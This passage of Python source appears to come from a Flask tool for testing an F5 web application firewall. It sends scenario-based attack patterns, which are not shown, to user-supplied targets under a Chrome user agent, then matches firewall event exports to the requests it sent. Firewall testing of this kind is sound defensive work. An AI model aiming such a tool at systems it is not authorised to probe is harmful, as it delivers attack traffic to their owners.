    fixed_headers = re.split(r"\s{2,}", first_line.strip())
    known_fields = {"req_id", "req_path", "original_path", "method"}
    if any(name.strip().lower() in known_fields for name in fixed_headers):
        fixed_events = []
        for line in text.splitlines()[1:]:
            if not line.strip():
                continue
            cells = re.split(r"\s{2,}", line.strip())
            if len(cells) == len(fixed_headers):
                fixed_events.append(dict(zip(fixed_headers, cells)))
        if fixed_events:
            if len(fixed_events) > 5000:
                raise ValueError("Event export contains more than 5,000 records.")
            return fixed_events

    delimiter = "\t" if first_line.count("\t") > first_line.count(",") else ","
    reader = csv.DictReader(io.StringIO(text), delimiter=delimiter)
    if not reader.fieldnames or not any(name and name.strip().lower() in
                                        {"req_id", "req_path", "original_path", "method"}
                                        for name in reader.fieldnames):
        raise ValueError("Could not find F5 event columns. Use the console's CSV export or JSON tab.")
    events = []
    for row in reader:
        event = {str(key).strip(): value for key, value in row.items() if key}
        if any(value not in (None, "") for value in event.values()):
            events.append(event)
        if len(events) > 5000:
            raise ValueError("Event export contains more than 5,000 records.")
    return events


def _event_field(event, *names):
    lowered = {str(key).strip().lower(): value for key, value in event.items()}
    for name in names:
        value = lowered.get(name.lower())
        if value not in (None, ""):
            return value
    return None


def _flatten_strings(value):
    value = _json_cell(value)
    if isinstance(value, dict):
        return [item for child in value.values() for item in _flatten_strings(child)]
    if isinstance(value, list):
        return [item for child in value for item in _flatten_strings(child)]
    if isinstance(value, str) and value:
        return [value]
    return []


def _timestamp(value):
    if not value:
        return None
    try:
        parsed = datetime.fromisoformat(str(value).replace("Z", "+00:00"))
        if parsed.tzinfo is None:
            parsed = parsed.replace(tzinfo=timezone.utc)
        return parsed.timestamp()
    except (TypeError, ValueError):
        return None


def _payload_match(row, event):
    req = row.get("request") or {}
    values = []
    sent_url = req.get("sent_url") or req.get("url") or row.get("url", "")
    parsed_url = urlsplit(sent_url)
    for query_values in parse_qs(parsed_url.query, keep_blank_values=True).values():
        values.extend(query_values)
    values.extend(_flatten_strings(req.get("sent_body") or req.get("body")))
    if not values:
        return True

    signatures = _json_cell(_event_field(event, "signatures")) or []
    if isinstance(signatures, dict):
        signatures = [signatures]
    signature_text = " ".join(
        str(signature.get(key, "")) for signature in signatures if isinstance(signature, dict)
        for key in ("matching_info", "name", "context")
    )
    req_params = " ".join(_flatten_strings(_event_field(event, "req_params")))
    event_text = " ".join([
        req_params,
        signature_text,
        " ".join(_flatten_strings(_event_field(event, "original_path", "req_path"))),
    ]).lower()
    event_text = re.sub(r"\s+", " ", event_text)

    stop_words = {"about", "after", "also", "database", "documentation", "example", "from",
                  "have", "here", "how", "into", "lesson", "literal", "note", "query",
                  "relative", "search", "table", "that", "the", "this", "tutorial", "with"}
    event_words = set(re.findall(r"[a-z0-9_%./-]{3,}", event_text))
    for value in values:
        normalized = re.sub(r"\s+", " ", str(value).lower()).strip()
        if normalized and normalized in event_text:
            return True
        words = set(re.findall(r"[a-z0-9_%./-]{3,}", normalized)) - stop_words
        overlap = words & event_words
        if len(overlap) >= 2 or any(len(word) >= 8 for word in overlap):
            return True
    return False


def _event_match(row, event):
    req = row.get("request") or {}
    req_url = urlsplit(req.get("sent_url") or req.get("url") or row.get("url", ""))
    def canonical_path(value):
        path = urlsplit(str(value)).path
        for _ in range(2):
            decoded = unquote(path)
            if decoded == path:
                break
            path = decoded
        return path.rstrip("/") or "/"

    row_path = canonical_path(req_url.path)
    event_path = _event_field(event, "original_path", "req_path", "path")
    if not event_path or str(event_path).upper() == "UNKNOWN":
        return False
    event_path = canonical_path(event_path)
    if event_path != row_path:
        return False

    req_headers = _json_cell(_event_field(event, "req_headers")) or {}
    if not isinstance(req_headers, dict):
        req_headers = {}
    event_method = _event_field(event, "method") or next(
        (value for key, value in req_headers.items() if str(key).lower() == "method"), None)
    row_method = req.get("method") or row.get("method")
    if event_method and row_method and str(event_method).upper() != str(row_method).upper():
        return False

    event_time = _timestamp(_event_field(event, "@timestamp", "timestamp", "time"))
    row_time = _timestamp(row.get("ts"))
    if event_time is not None and row_time is not None and abs(event_time - row_time) > 600:
        return False
    return _payload_match(row, event)


def _event_summary(event):
    signatures = _json_cell(_event_field(event, "signatures")) or []
    if isinstance(signatures, dict):
        signatures = [signatures]
    reasons = _json_cell(_event_field(event, "req_risk_reasons")) or []
    if isinstance(reasons, str):
        reasons = [reasons]
    headers = _json_cell(_event_field(event, "req_headers")) or {}
    if not isinstance(headers, dict):
        headers = {}
    method = _event_field(event, "method") or next(
        (value for key, value in headers.items() if str(key).lower() == "method"), None)
    return {
        "req_id": _event_field(event, "req_id"),
        "timestamp": _event_field(event, "@timestamp", "timestamp", "time"),
        "method": method,
        "path": _event_field(event, "original_path", "req_path", "path"),
        "action": _event_field(event, "action", "recommended_action"),
        "req_risk": _event_field(event, "req_risk"),
        "req_risk_reasons": reasons,
        "signatures": [{
            "id": signature.get("id"),
            "name": signature.get("name"),
            "risk": signature.get("risk"),
            "accuracy": signature.get("accuracy"),
        } for signature in signatures if isinstance(signature, dict)],
        "match_quality": "time + method + path + payload",
    }


@app.post("/api/import-events")
def import_events():
    cfg = request.get_json(silent=True) or {}
    rows = cfg.get("rows")
    if not isinstance(rows, list) or not rows or len(rows) > 200:
        return jsonify({"error": "Run a scenario first; at most 200 request rows can be matched."}), 400
    try:
        events = _parse_event_export(str(cfg.get("text", "")))
    except ValueError as error:
        return jsonify({"error": str(error)}), 400

    matched_rows = 0
    output = []
    for row in rows:
        if not isinstance(row, dict):
            continue
        matched = [_event_summary(event) for event in events if _event_match(row, event)]
        updated = dict(row)
        updated["f5_events"] = matched
        matched_rows += bool(matched)
        output.append(updated)
    return jsonify({"events": len(events), "rows_matched": matched_rows, "rows": output})


def _valid_target(url):
    parsed = urlsplit(url)
    return parsed.scheme in ("http", "https") and parsed.netloc and not parsed.username and not parsed.password


@app.post("/api/run")
def run():
    cfg = request.get_json(silent=True) or {}
    base = str(cfg.get("base", DEFAULT_TARGET)).strip().rstrip("/")
    if not _valid_target(base):
        return jsonify({"error": "Target must be an http(s) URL without embedded credentials."}), 400


    base2 = str(cfg.get("base2", "")).strip().rstrip("/")
    if base2 and not _valid_target(base2):
        return jsonify({"error": "Second target must be an http(s) URL without embedded credentials."}), 400

    scenario = cfg.get("scenario", "demo")
    if scenario not in SCENARIOS:
        return jsonify({"error": "Unknown scenario."}), 400
    delay = min(3.0, max(0.0, float(cfg.get("delay", 0.2))))
    timeout = min(30.0, max(1.0, float(cfg.get("timeout", 8.0))))
    patterns = [p for label in SCENARIOS[scenario] for p in ALL[label]]

    targets = [base] + ([base2] if base2 and base2 != base else [])
    rows = []
    for target in targets:
        session = requests.Session()
        session.headers.update({"User-Agent": CHROME_UA})
        for pattern in patterns:
            result = send(session, target, pattern, timeout)
            row = record(pattern, target, result)
            row["target"] = target
            rows.append(row)
            if delay:
                time.sleep(delay)
    return jsonify({"scenario": scenario, "targets": targets, "rows": rows})

if __name__ == "__main__":
    if len(sys.argv) > 1 and sys.argv[1] == "serve":
        sys.argv.pop(1)
        app.run(host="0.0.0.0", port=5000, use_reloader=True, use_debugger=False)
    else:
        main()
